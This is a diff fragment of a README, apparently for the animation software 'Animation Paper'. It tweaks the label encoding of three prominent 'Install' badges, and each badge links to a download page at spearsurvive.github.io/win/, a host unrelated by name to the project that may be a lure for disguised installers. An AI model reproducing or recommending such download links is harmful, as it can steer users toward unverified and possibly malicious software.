@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Animation Paper](https://img.shields.io/badge/⬇_Install_Animation%20Paper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Animation Paper](https://img.shields.io/badge/⬇_Install_Animation+Paper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Animation Paper is a 2D traditional hand-drawn animation software with a focus o
 
 <div align="center">
 
-[![⬇ Install Animation Paper](https://img.shields.io/badge/⬇_Install_Animation%20Paper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Animation Paper](https://img.shields.io/badge/⬇_Install_Animation+Paper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Animation Paper is a 2D traditional hand-drawn animation software with a focus o
 
 <div align="center">
 
-[![⬇ Install Animation Paper](https://img.shields.io/badge/⬇_Install_Animation%20Paper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Animation Paper](https://img.shields.io/badge/⬇_Install_Animation+Paper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
